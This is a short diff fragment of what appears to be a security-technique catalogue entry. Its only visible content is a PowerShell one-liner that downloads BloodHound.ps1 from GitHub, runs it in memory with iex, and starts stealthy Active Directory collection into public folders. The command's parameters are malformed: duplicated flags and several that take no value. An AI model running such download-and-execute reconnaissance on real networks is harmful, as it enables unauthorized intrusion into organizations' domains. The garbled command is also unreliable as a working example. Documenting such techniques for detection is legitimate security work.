@@ -16,3 +16,5 @@ updated_at: '2023-05-29T16:48:53.365139+00:00'
 iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'));Invoke-Bloodhound -CSVFolder c:\temp -CSVPrefix Invoke-BloodHound -DomainController -Domain -CSVFolder C:\users\public\libraries -CSVPrefix -CollectionMethod Stealth
 
 ```
+
+
